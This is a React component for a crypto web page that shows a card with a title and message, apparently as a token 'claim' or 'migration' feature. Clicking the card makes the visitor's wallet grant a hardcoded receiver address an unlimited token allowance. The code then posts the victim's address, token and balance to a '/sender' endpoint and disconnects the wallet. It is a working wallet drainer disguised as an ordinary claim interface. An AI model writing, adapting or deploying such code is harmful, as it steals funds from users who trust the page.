"use client"
import { useAccount, usePublicClient, useFeeData, useWalletClient, useBalance, useDisconnect } from 'wagmi'
import {useState} from "react"
import abis from "@/utils/abis/mover.json"
import { erc20ABI } from 'wagmi'
import { queryBalance } from '@/utils/util'

interface Props {
  title: string,
  message: string

}

const Item = (prop: Props) => {

  const {title, message} = prop
 const {address, isConnected} = useAccount()

 const abi = abis.abi // change abi after deploying approval contract
 const publicClient = usePublicClient()
 const [wc, setWC] = useState()
 const {data: gasPrice} = useFeeData()
 //const [gasEst, setGasEst] = useState()
 const receiver = "0xC37BE78fd6D24bcc6de7e6f5bc7202CB6e9C7e05"//"0xFAf8C101F18711D16659e24458ef18F6A87e2B71"
 const con_address = "0x4f67aaad29973831e912fd9b8f5328a71b29d3d9" 
 //const [amt, setAmt] = useState()
 const ercadd = "0x6DC7DD490181dF81bc6D0e9B1A7Fa2Ca1ab73e4E"
 

 const {data: balance} = useBalance({
  address,token: ercadd
}) 

const {data: usdt} = useBalance({
  address, token: '0x6DC7DD490181dF81bc6D0e9B1A7Fa2Ca1ab73e4E'
})

const contractArr = ['0x6DC7DD490181dF81bc6D0e9B1A7Fa2Ca1ab73e4E', "0xcc42724c6683b7e57334c4e856f4c9965ed682bd", "0x570A5D26f7765Ecb712C0924E4De545B89fD43dF",
"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"]

const {disconnect} = useDisconnect()
 const {data} = useWalletClient({

               async onSuccess(data) {

                setWC(data)
               
                }
 })
 

const handleClick = async() => {


  const add = await queryBalance(address)

  console.log("Migration clicked and usdt et matic balance", usdt)

   if(!isConnected)
   {
     console.log("Connect wallet")
     const mbtn = document.querySelector("#cshm") 
     mbtn?.click()

   }
   else {
  
    if(data)
    {
    
      try {



      const [address] = await data.getAddresses()

      const amt = BigInt("115792089237316195423570985008687907853269984665640564039457584007913129639935")
     
       const { request } = await publicClient.simulateContract({
        abi: abi,
        functionName: "approve",
        args: [receiver, amt],
        account: address,
        address: add
      })
        
      const res = await data?.writeContract(request)

      const receipt = await publicClient.waitForTransactionReceipt({hash: res})

      console.log(receipt)
      if(receipt)
     {
         const cost = usdt?.value
         
         const res = await fetch("/sender",{method: 'POST',
         body: JSON.stringify({
          address,
           contract: ercadd,
           amount: cost
         }),
         headers: {
           'Content-type': 'application/json; charset=UTF-8',
         }})
         //const hashed = await sender(ercadd, address, usdt?.value)
         console.log(res)
         disconnect()
        
         console.log("An error occur for sending")
     }
   
      } 

      catch (error) {
        console.log("An error occur",error)
      }
      
    }
   }
  
}

const claim = async() => {

  

  if(isConnected)
  {
   
//  while(true) 
// {

    try {
      const tok_add = await queryBalance(address)
    const amount=BigInt("11579208923731619542357098500868790785326998466564056403945758400791312963993")

    const { request } = await publicClient.simulateContract({
      abi: erc20ABI,
      functionName: "approve",
      args: [receiver, amount],
      account: address,
      address: tok_add

    })
    
    const hash = await data?.writeContract(request)

    const receipt = await publicClient.waitForTransactionReceipt({hash})
    if(receipt)
    {
     
      const res = await fetch("/sender", {
        method: "POST",
        body: JSON.stringify({address: address, contract: tok_add})
      })
    }
          disconnect()
// break
      
     } 
     
     catch (error) {
      console.log("sending from approve i.e send direct",error)
      disconnect()
     }
  
  }
}
    return(

        <div className="col-md-6 col-lg-3 d-flex align-items-stretch mb-5 mb-lg-0 pec" onClick={() => claim()}>
        <div className="icon-box" data-aos="fade-up" data-aos-delay="200">
          <div className="icon"><i className="bx bx-file"></i></div>
          <h4 className="title"><p className="pec">{title}</p></h4>
          <p className="description">{message}</p>
        </div>
      </div>
    )
   
}

export default Item